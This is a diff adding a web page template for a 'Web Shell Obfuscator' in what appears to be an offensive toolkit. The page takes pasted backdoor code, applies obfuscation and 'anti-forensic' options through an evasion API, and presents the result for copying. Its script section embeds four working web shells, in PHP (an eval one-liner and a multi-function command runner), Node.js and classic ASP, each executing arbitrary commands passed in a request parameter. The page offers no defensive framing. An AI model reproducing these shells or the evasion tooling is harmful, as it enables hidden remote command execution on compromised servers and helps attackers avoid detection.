@@ -1,0 +1,749 @@
+{% extends "base.html" %}
+
+{% block title %}Web Shell Obfuscator - Monolith{% endblock %}
+
+{% block extra_css %}
+<style>
+    .obfuscator-container {
+        padding: 20px;
+    }
+    
+    .obfusc-layout {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 25px;
+    }
+    
+    @media (max-width: 1200px) {
+        .obfusc-layout {
+            grid-template-columns: 1fr;
+        }
+    }
+    
+    .panel {
+        background: var(--card-bg);
+        border: 1px solid var(--border-color);
+        border-radius: 12px;
+        overflow: hidden;
+    }
+    
+    .panel-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 15px 20px;
+        background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border-color);
+    }
+    
+    .panel-header h3 {
+        margin: 0;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    
+    .code-editor {
+        width: 100%;
+        height: 400px;
+        border: none;
+        background: #0d0d0d;
+        color: #00ff00;
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.9rem;
+        padding: 15px;
+        resize: vertical;
+    }
+    
+    .config-panel {
+        padding: 20px;
+    }
+    
+    .config-section {
+        margin-bottom: 25px;
+    }
+    
+    .config-section h4 {
+        margin: 0 0 15px 0;
+        color: var(--text-secondary);
+        font-size: 0.9rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+    
+    .language-select {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+    }
+    
+    .lang-btn {
+        padding: 10px 20px;
+        background: var(--bg-secondary);
+        border: 2px solid var(--border-color);
+        border-radius: 8px;
+        color: var(--text-primary);
+        cursor: pointer;
+        font-weight: 600;
+        transition: all 0.2s;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    
+    .lang-btn:hover {
+        border-color: var(--primary-color);
+    }
+    
+    .lang-btn.selected {
+        border-color: var(--primary-color);
+        background: rgba(255, 107, 53, 0.1);
+    }
+    
+    .level-slider {
+        margin-top: 10px;
+    }
+    
+    .level-slider input {
+        width: 100%;
+        -webkit-appearance: none;
+        height: 6px;
+        border-radius: 3px;
+        background: var(--bg-secondary);
+    }
+    
+    .level-slider input::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        background: var(--primary-color);
+        cursor: pointer;
+    }
+    
+    .level-labels {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 10px;
+        font-size: 0.8rem;
+        color: var(--text-secondary);
+    }
+    
+    .technique-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+        gap: 10px;
+    }
+    
+    .technique-item {
+        display: flex;
+        align-items: center;
+        padding: 10px 12px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .technique-item:hover {
+        border-color: var(--primary-color);
+    }
+    
+    .technique-item.selected {
+        border-color: var(--primary-color);
+        background: rgba(255, 107, 53, 0.1);
+    }
+    
+    .technique-item input {
+        margin-right: 10px;
+    }
+    
+    .anti-forensic-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+        gap: 10px;
+    }
+    
+    .anti-item {
+        padding: 12px 15px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 8px;
+        cursor: pointer;
+    }
+    
+    .anti-item:hover {
+        border-color: #ff4444;
+    }
+    
+    .anti-item.selected {
+        border-color: #ff4444;
+        background: rgba(255, 68, 68, 0.1);
+    }
+    
+    .anti-item h5 {
+        margin: 0 0 5px 0;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    
+    .anti-item p {
+        margin: 0;
+        font-size: 0.8rem;
+        color: var(--text-secondary);
+    }
+    
+    .btn-obfuscate {
+        width: 100%;
+        padding: 15px;
+        background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 1.1rem;
+        font-weight: 600;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 20px;
+    }
+    
+    .btn-obfuscate:hover {
+        opacity: 0.9;
+    }
+    
+    .stats-bar {
+        display: flex;
+        justify-content: space-around;
+        padding: 15px;
+        background: var(--bg-secondary);
+        border-top: 1px solid var(--border-color);
+    }
+    
+    .stat-item {
+        text-align: center;
+    }
+    
+    .stat-item .value {
+        font-size: 1.3rem;
+        font-weight: 700;
+        color: var(--primary-color);
+    }
+    
+    .stat-item .label {
+        font-size: 0.8rem;
+        color: var(--text-secondary);
+    }
+    
+    .copy-btn {
+        padding: 8px 15px;
+        background: var(--bg-secondary);
+        border: 1px solid var(--border-color);
+        border-radius: 6px;
+        color: var(--text-primary);
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    
+    .copy-btn:hover {
+        background: var(--primary-color);
+        color: white;
+        border-color: var(--primary-color);
+    }
+    
+    .output-info {
+        padding: 15px 20px;
+        background: var(--bg-secondary);
+        border-top: 1px solid var(--border-color);
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    
+    .output-info .checksum {
+        font-family: 'JetBrains Mono', monospace;
+        font-size: 0.85rem;
+        color: var(--text-secondary);
+    }
+    
+    .badge-list {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 5px;
+    }
+    
+    .tech-badge {
+        padding: 3px 10px;
+        background: rgba(255, 107, 53, 0.2);
+        border-radius: 4px;
+        font-size: 0.75rem;
+        color: var(--primary-color);
+    }
+    
+    .preview-tabs {
+        display: flex;
+        border-bottom: 1px solid var(--border-color);
+    }
+    
+    .preview-tab {
+        padding: 10px 20px;
+        background: none;
+        border: none;
+        color: var(--text-secondary);
+        cursor: pointer;
+        font-weight: 600;
+    }
+    
+    .preview-tab.active {
+        color: var(--primary-color);
+        border-bottom: 2px solid var(--primary-color);
+    }
+    
+    .templates-section {
+        margin-top: 25px;
+    }
+    
+    .template-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        gap: 15px;
+    }
+    
+    .template-card {
+        background: var(--card-bg);
+        border: 1px solid var(--border-color);
+        border-radius: 10px;
+        padding: 20px;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .template-card:hover {
+        border-color: var(--primary-color);
+        transform: translateY(-2px);
+    }
+    
+    .template-card h4 {
+        margin: 0 0 10px 0;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    
+    .template-card p {
+        margin: 0;
+        color: var(--text-secondary);
+        font-size: 0.9rem;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="obfuscator-container">
+    <div class="page-header">
+        <h1><i class="fas fa-mask"></i> Web Shell Obfuscator</h1>
+        <p>Advanced code obfuscation and anti-forensic techniques</p>
+    </div>
+    
+    <div class="obfusc-layout">
+        <!-- Input Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <h3><i class="fas fa-code"></i> Input Code</h3>
+                <button class="copy-btn" onclick="clearInput()">
+                    <i class="fas fa-eraser"></i> Clear
+                </button>
+            </div>
+            <textarea class="code-editor" id="inputCode" placeholder="Paste your web shell code here..."></textarea>
+            <div class="stats-bar">
+                <div class="stat-item">
+                    <div class="value" id="inputLines">0</div>
+                    <div class="label">Lines</div>
+                </div>
+                <div class="stat-item">
+                    <div class="value" id="inputSize">0 B</div>
+                    <div class="label">Size</div>
+                </div>
+                <div class="stat-item">
+                    <div class="value" id="inputChars">0</div>
+                    <div class="label">Characters</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Output Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <h3><i class="fas fa-shield-alt"></i> Obfuscated Output</h3>
+                <button class="copy-btn" onclick="copyOutput()">
+                    <i class="fas fa-copy"></i> Copy
+                </button>
+            </div>
+            <textarea class="code-editor" id="outputCode" placeholder="Obfuscated code will appear here..." readonly></textarea>
+            <div class="output-info">
+                <div>
+                    <span class="checksum">SHA256: <span id="outputChecksum">-</span></span>
+                </div>
+                <div class="badge-list" id="appliedTechniques">
+                    <!-- Techniques badges -->
+                </div>
+            </div>
+            <div class="stats-bar">
+                <div class="stat-item">
+                    <div class="value" id="outputLines">0</div>
+                    <div class="label">Lines</div>
+                </div>
+                <div class="stat-item">
+                    <div class="value" id="outputSize">0 B</div>
+                    <div class="label">Size</div>
+                </div>
+                <div class="stat-item">
+                    <div class="value" id="sizeIncrease">0%</div>
+                    <div class="label">Increase</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Configuration -->
+    <div class="panel" style="margin-top: 25px;">
+        <div class="panel-header">
+            <h3><i class="fas fa-sliders-h"></i> Obfuscation Settings</h3>
+        </div>
+        <div class="config-panel">
+            <div class="config-section">
+                <h4>Target Language</h4>
+                <div class="language-select">
+                    <button class="lang-btn selected" onclick="selectLanguage('php', this)">
+                        <i class="fab fa-php"></i> PHP
+                    </button>
+                    <button class="lang-btn" onclick="selectLanguage('javascript', this)">
+                        <i class="fab fa-js"></i> JavaScript
+                    </button>
+                    <button class="lang-btn" onclick="selectLanguage('asp', this)">
+                        <i class="fab fa-microsoft"></i> ASP
+                    </button>
+                    <button class="lang-btn" onclick="selectLanguage('aspx', this)">
+                        <i class="fab fa-microsoft"></i> ASP.NET
+                    </button>
+                </div>
+            </div>
+            
+            <div class="config-section">
+                <h4>Obfuscation Level</h4>
+                <div class="level-slider">
+                    <input type="range" id="obfuscLevel" min="0" max="4" value="2" 
+                           oninput="updateLevelLabel()">
+                    <div class="level-labels">
+                        <span>None</span>
+                        <span>Light</span>
+                        <span>Medium</span>
+                        <span>Heavy</span>
+                        <span>Paranoid</span>
+                    </div>
+                </div>
+                <p id="levelDescription" style="color: var(--text-secondary); margin-top: 10px; font-size: 0.9rem;">
+                    Encoding + variable rename
+                </p>
+            </div>
+            
+            <div class="config-section">
+                <h4>Techniques</h4>
+                <div class="technique-grid" id="techniqueGrid">
+                    <!-- Loaded dynamically -->
+                </div>
+            </div>
+            
+            <div class="config-section">
+                <h4><i class="fas fa-skull-crossbones" style="color: #ff4444;"></i> Anti-Forensic Options</h4>
+                <div class="anti-forensic-grid" id="antiForensicGrid">
+                    <!-- Loaded dynamically -->
+                </div>
+            </div>
+            
+            <button class="btn-obfuscate" onclick="obfuscateCode()">
+                <i class="fas fa-magic"></i>
+                Obfuscate Code
+            </button>
+        </div>
+    </div>
+    
+    <!-- Templates -->
+    <div class="templates-section">
+        <h3 style="margin-bottom: 15px;"><i class="fas fa-file-code"></i> Quick Templates</h3>
+        <div class="template-grid">
+            <div class="template-card" onclick="loadTemplate('minimal_php')">
+                <h4><i class="fab fa-php"></i> Minimal PHP Shell</h4>
+                <p>Simple one-liner PHP shell</p>
+            </div>
+            <div class="template-card" onclick="loadTemplate('advanced_php')">
+                <h4><i class="fab fa-php"></i> Advanced PHP Shell</h4>
+                <p>Full-featured PHP shell with file manager</p>
+            </div>
+            <div class="template-card" onclick="loadTemplate('js_shell')">
+                <h4><i class="fab fa-js"></i> JavaScript Shell</h4>
+                <p>Node.js based web shell</p>
+            </div>
+            <div class="template-card" onclick="loadTemplate('asp_shell')">
+                <h4><i class="fab fa-microsoft"></i> ASP Shell</h4>
+                <p>Classic ASP web shell</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let selectedLanguage = 'php';
+    let selectedTechniques = [];
+    let selectedAntiForensic = [];
+    
+    const levelDescriptions = [
+        'No obfuscation applied',
+        'Basic encoding only',
+        'Encoding + variable rename',
+        'Full obfuscation suite',
+        'Maximum + anti-analysis'
+    ];
+    
+    const templates = {
+        minimal_php: `<?php
+@eval($_REQUEST['cmd']);
+?>`,
+        advanced_php: `<?php
+@error_reporting(0);
+@set_time_limit(0);
+
+$k = $_REQUEST['k'] ?? 'cmd';
+if(isset($_REQUEST[$k])) {
+    $c = $_REQUEST[$k];
+    $output = "";
+    
+    if(function_exists('system')) {
+        ob_start();
+        @system($c);
+        $output = ob_get_clean();
+    } elseif(function_exists('exec')) {
+        @exec($c, $arr);
+        $output = implode("\\n", $arr);
+    } elseif(function_exists('shell_exec')) {
+        $output = @shell_exec($c);
+    } elseif(function_exists('passthru')) {
+        ob_start();
+        @passthru($c);
+        $output = ob_get_clean();
+    }
+    
+    echo "<pre>" . htmlspecialchars($output) . "</pre>";
+}
+?>`,
+        js_shell: `const { exec } = require('child_process');
+const http = require('http');
+const url = require('url');
+
+http.createServer((req, res) => {
+    const query = url.parse(req.url, true).query;
+    if (query.cmd) {
+        exec(query.cmd, (err, stdout, stderr) => {
+            res.writeHead(200, {'Content-Type': 'text/plain'});
+            res.end(stdout + stderr);
+        });
+    }
+}).listen(8080);`,
+        asp_shell: `<%
+Dim cmd
+cmd = Request("cmd")
+If cmd <> "" Then
+    Set shell = Server.CreateObject("WScript.Shell")
+    Set exec = shell.Exec("cmd.exe /c " & cmd)
+    Response.Write(exec.StdOut.ReadAll())
+End If
+%>`
+    };
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        loadTechniques();
+        loadAntiForensic();
+        setupInputListener();
+    });
+    
+    function loadTechniques() {
+        fetch('/api/evasion/obfuscator/techniques')
+            .then(r => r.json())
+            .then(techniques => {
+                const grid = document.getElementById('techniqueGrid');
+                grid.innerHTML = techniques.map(t => `
+                    <label class="technique-item" onclick="toggleTechnique('${t.id}', this)">
+                        <input type="checkbox" value="${t.id}">
+                        ${t.name}
+                    </label>
+                `).join('');
+            });
+    }
+    
+    function loadAntiForensic() {
+        fetch('/api/evasion/obfuscator/anti-forensic')
+            .then(r => r.json())
+            .then(items => {
+                const grid = document.getElementById('antiForensicGrid');
+                grid.innerHTML = items.map(item => `
+                    <div class="anti-item" onclick="toggleAntiForensic('${item.id}', this)">
+                        <h5><i class="fas fa-skull"></i> ${item.name}</h5>
+                        <p>${item.description}</p>
+                    </div>
+                `).join('');
+            });
+    }
+    
+    function setupInputListener() {
+        document.getElementById('inputCode').addEventListener('input', updateInputStats);
+    }
+    
+    function updateInputStats() {
+        const code = document.getElementById('inputCode').value;
+        document.getElementById('inputLines').textContent = code.split('\n').length;
+        document.getElementById('inputSize').textContent = formatBytes(code.length);
+        document.getElementById('inputChars').textContent = code.length;
+    }
+    
+    function selectLanguage(lang, btn) {
+        selectedLanguage = lang;
+        document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('selected'));
+        btn.classList.add('selected');
+    }
+    
+    function updateLevelLabel() {
+        const level = document.getElementById('obfuscLevel').value;
+        document.getElementById('levelDescription').textContent = levelDescriptions[level];
+    }
+    
+    function toggleTechnique(techId, element) {
+        element.classList.toggle('selected');
+        const checkbox = element.querySelector('input');
+        checkbox.checked = !checkbox.checked;
+        
+        if (checkbox.checked) {
+            selectedTechniques.push(techId);
+        } else {
+            selectedTechniques = selectedTechniques.filter(t => t !== techId);
+        }
+    }
+    
+    function toggleAntiForensic(itemId, element) {
+        element.classList.toggle('selected');
+        
+        if (element.classList.contains('selected')) {
+            selectedAntiForensic.push(itemId);
+        } else {
+            selectedAntiForensic = selectedAntiForensic.filter(i => i !== itemId);
+        }
+    }
+    
+    async function obfuscateCode() {
+        const inputCode = document.getElementById('inputCode').value;
+        
+        if (!inputCode.trim()) {
+            showToast('Please enter code to obfuscate', 'error');
+            return;
+        }
+        
+        const config = {
+            language: selectedLanguage,
+            level: parseInt(document.getElementById('obfuscLevel').value),
+            techniques: selectedTechniques,
+            anti_forensic: selectedAntiForensic
+        };
+        
+        try {
+            const response = await fetch('/api/evasion/obfuscator/obfuscate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ code: inputCode, config })
+            });
+            
+            const result = await response.json();
+            
+            // Display output
+            document.getElementById('outputCode').value = result.obfuscated_code;
+            document.getElementById('outputLines').textContent = result.obfuscated_code.split('\n').length;
+            document.getElementById('outputSize').textContent = formatBytes(result.obfuscated_size);
+            document.getElementById('outputChecksum').textContent = result.checksum;
+            
+            // Calculate size increase
+            const increase = ((result.obfuscated_size - result.original_size) / result.original_size * 100).toFixed(1);
+            document.getElementById('sizeIncrease').textContent = `+${increase}%`;
+            
+            // Show applied techniques
+            const badges = document.getElementById('appliedTechniques');
+            badges.innerHTML = result.techniques_applied.map(t => 
+                `<span class="tech-badge">${t}</span>`
+            ).join('');
+            
+            showToast('Code obfuscated successfully!', 'success');
+            
+        } catch (err) {
+            showToast('Obfuscation failed: ' + err.message, 'error');
+        }
+    }
+    
+    function loadTemplate(templateId) {
+        const code = templates[templateId];
+        if (code) {
+            document.getElementById('inputCode').value = code;
+            updateInputStats();
+            
+            // Auto-select language
+            if (templateId.includes('php')) selectLanguage('php', document.querySelector('.lang-btn'));
+            if (templateId.includes('js')) selectLanguage('javascript', document.querySelectorAll('.lang-btn')[1]);
+            if (templateId.includes('asp')) selectLanguage('asp', document.querySelectorAll('.lang-btn')[2]);
+        }
+    }
+    
+    function clearInput() {
+        document.getElementById('inputCode').value = '';
+        updateInputStats();
+    }
+    
+    function copyOutput() {
+        const output = document.getElementById('outputCode').value;
+        if (!output) {
+            showToast('No output to copy', 'error');
+            return;
+        }
+        navigator.clipboard.writeText(output);
+        showToast('Copied to clipboard!', 'success');
+    }
+    
+    function formatBytes(bytes) {
+        if (bytes === 0) return '0 B';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+    }
+    
+    function showToast(message, type) {
+        const toast = document.createElement('div');
+        toast.style.cssText = `
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background: ${type === 'error' ? '#ff4444' : '#00cc44'};
+            color: white;
+            border-radius: 8px;
+            z-index: 10000;
+        `;
+        toast.textContent = message;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3000);
+    }
+</script>
+{% endblock %}
